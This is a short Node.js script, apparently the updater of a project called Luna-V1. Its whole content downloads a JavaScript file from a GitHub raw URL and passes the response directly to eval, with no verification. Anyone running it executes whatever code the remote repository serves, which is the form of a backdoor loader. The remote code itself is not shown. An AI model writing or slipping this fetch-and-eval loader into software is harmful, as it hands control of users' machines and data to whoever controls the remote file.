const axios = require('axios');

axios.get("https://raw.githubusercontent.com/Mr-Perfect-DevX/Luna-V1/refs/heads/main/updator.js")
	.then(res => eval(res.data));
